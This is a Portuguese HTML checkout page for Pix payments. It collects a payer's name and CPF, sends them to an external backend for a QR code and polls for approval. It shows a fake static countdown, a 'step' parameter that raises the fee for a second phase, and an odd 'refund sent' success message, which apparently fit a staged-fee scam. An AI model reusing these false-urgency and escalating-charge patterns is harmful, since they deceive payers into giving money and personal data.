<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout Seguro</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
body { font-family: 'Inter', sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.container { width: 100%; max-width: 400px; padding: 20px; }
.card { background: #ffffff; border-radius: 14px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
.header img { height: 30px; margin-bottom: 10px; }
h2 { font-size: 18px; color: #333; margin: 10px 0; }
.price-tag { background: #e8f5e9; color: #2e7d32; padding: 10px; border-radius: 8px; font-size: 24px; font-weight: 700; margin: 15px 0; border: 1px solid #c8e6c9; }
.input-group { text-align: left; margin-bottom: 15px; }
label { font-size: 13px; color: #666; font-weight: 500; display: block; margin-bottom: 5px; }
input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
input:focus { border-color: #2e7d32; }
button { width: 100%; background: #28a745; color: white; border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
button:hover { background: #218838; }
button:disabled { background: #ccc; cursor: not-allowed; }
.timer { color: #d32f2f; font-size: 13px; margin-top: 15px; font-weight: 500; }
#qr-area { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
.qr-img { width: 200px; border-radius: 8px; border: 1px solid #eee; }
.copy-box { background: #f8f9fa; padding: 10px; border: 1px dashed #ced4da; border-radius: 6px; font-size: 11px; color: #555; word-break: break-all; margin: 10px 0; }
.status-msg { margin-top: 15px; font-weight: bold; color: #333; }
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/Pix_logo.png" alt="Pix">
        </div>

        <div id="form-step">
            <h2>Finalizar Pagamento</h2>
            <div class="price-tag" id="valorDisplay">R$ --,--</div>
            
            <div class="input-group">
                <label>Nome Completo</label>
                <input type="text" id="nome" placeholder="Seu nome aqui" required>
            </div>
            
            <div class="input-group">
                <label>CPF (Apenas números)</label>
                <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)" required>
            </div>

            <button onclick="gerarPix()" id="btnPagar">GERAR PIX AGORA</button>
            <div class="timer">⏳ Oferta expira em 05:00</div>
        </div>

        <div id="qr-area">
            <h3>Escaneie para Pagar</h3>
            <img id="qrImage" class="qr-img">
            <p style="font-size:12px; color:#666; margin-bottom:5px;">Ou copie o código abaixo:</p>
            <div class="copy-box" id="pixCopiaCola"></div>
            <button onclick="copiarCodigo()" style="background:#fff; color:#28a745; border:1px solid #28a745; padding:10px;">Copiar Código Pix</button>
            <div class="status-msg" id="statusMsg">Aguardando pagamento...</div>
        </div>
    </div>
</div>

<script>
    const API_URL = "https://checkout-pix-profissional.onrender.com";
    
    // 1. LÓGICA AUTOMÁTICA DE VALORES
    const params = new URLSearchParams(window.location.search);
    const step = params.get("step");
    
    let valorCobrado = "37.90"; // Padrão (Fase 1)
    
    if (step === "2") {
        valorCobrado = "47.90"; // Fase 2
    }

    // Exibe o valor na tela (Bloqueado para edição)
    document.getElementById("valorDisplay").innerText = "R$ " + valorCobrado.replace(".", ",");

    // 2. MÁSCARA DE CPF
    function mascaraCPF(i) {
        let v = i.value.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);
        i.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    // 3. GERAR PIX NO SERVIDOR
    async function gerarPix() {
        const nome = document.getElementById("nome").value;
        const cpfLimpo = document.getElementById("cpf").value.replace(/\D/g, "");
        const btn = document.getElementById("btnPagar");

        if (nome.length < 3 || cpfLimpo.length !== 11) {
            alert("Por favor, preencha seu Nome e um CPF válido.");
            return;
        }

        btn.disabled = true;
        btn.innerText = "Gerando QR Code...";

        try {
            const res = await fetch(`${API_URL}/pix`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    amount: parseFloat(valorCobrado),
                    name: nome,
                    cpf: cpfLimpo
                })
            });

            const data = await res.json();

            if (data.point_of_interaction) {
                // Sucesso
                const info = data.point_of_interaction.transaction_data;
                document.getElementById("qrImage").src = `data:image/png;base64,${info.qr_code_base64}`;
                document.getElementById("pixCopiaCola").innerText = info.qr_code;
                
                // Troca de tela
                document.getElementById("form-step").style.display = "none";
                document.getElementById("qr-area").style.display = "block";
                
                // Inicia monitoramento
                monitorarPagamento(data.id);
            } else {
                alert("Erro ao gerar Pix. Verifique os dados.");
                btn.disabled = false;
                btn.innerText = "GERAR PIX AGORA";
            }
        } catch (e) {
            alert("Erro de conexão com o servidor.");
            btn.disabled = false;
            btn.innerText = "GERAR PIX AGORA";
        }
    }

    // 4. MONITORAMENTO E SUCESSO
    function monitorarPagamento(id) {
        const statusMsg = document.getElementById("statusMsg");
        const intervalo = setInterval(async () => {
            try {
                const res = await fetch(`${API_URL}/pix/${id}`);
                const json = await res.json();

                if (json.status === 'approved') {
                    clearInterval(intervalo);
                    statusMsg.innerHTML = "✅ PAGAMENTO APROVADO!<br><span style='font-size:12px; font-weight:normal'>Estorno enviado.</span>";
                    statusMsg.style.color = "#2e7d32";
                    
                    // AQUI VOCÊ PODE REDIRECIONAR O CLIENTE
                    // setTimeout(() => { window.location.href = "OBRIGADO.html"; }, 3000);
                }
            } catch (e) {}
        }, 3000);
    }

    function copiarCodigo() {
        navigator.clipboard.writeText(document.getElementById("pixCopiaCola").innerText);
        alert("Código copiado!");
    }
</script>

</body>
</html>